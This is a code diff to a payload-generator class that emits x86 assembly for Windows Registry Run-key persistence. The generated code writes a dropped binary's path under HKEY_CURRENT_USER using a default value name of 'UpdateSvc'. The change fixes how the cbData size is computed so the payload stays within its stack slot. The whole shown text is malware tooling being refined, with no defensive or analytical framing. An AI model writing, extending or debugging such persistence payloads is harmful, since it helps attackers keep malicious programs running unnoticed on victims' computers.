@@ -35,16 +35,18 @@ class RegistryPersistTemplate(PayloadTemplate):
 
         subkey_off    = -layout.slot("reg_subkey").offset
         valname_off   = -layout.slot("reg_value_name").offset
-        binpath_off   = -layout.slot("dst_path").offset
+        binpath_slot  = layout.slot("dst_path")
+        binpath_off   = -binpath_slot.offset
 
-        # MAX_PATH for cbData -- REG_SZ consumers read to the null
-        # terminator, so extra trailing nulls are harmless.
-        data_size = 260
+        # cbData must not exceed the stack slot allocation.  The slot
+        # size is ceil4(len + 1), which is always >= the null-terminated
+        # string length and never reads past the slot boundary.
+        data_size = binpath_slot.size
 
         return "\n".join([
             "; -- Registry Run-Key Persistence --",
             f"; Value: {config.service_name or 'UpdateSvc'}",
-            f"; Binary: (from manifest dst_path string slot)",
+            f"; Binary: (from manifest dst_path string slot, {data_size} bytes)",
             "",
 
             "    ; RegOpenKeyExA(HKEY_CURRENT_USER, subkey, 0, KEY_SET_VALUE, &hKey)",
@@ -65,7 +67,7 @@ class RegistryPersistTemplate(PayloadTemplate):
 
             "    ; RegSetValueExA(hKey, valueName, 0, REG_SZ, dst_path, cbData)",
             *safe_push_imm(data_size, bc),
-            f"    ; cbData = MAX_PATH ({data_size})",
+            f"    ; cbData = {data_size} (slot size)",
             *safe_lea("eax", "ebp", binpath_off, bc),
             "    push eax                    ; lpData = &dst_path",
             *safe_push_imm(1, bc),
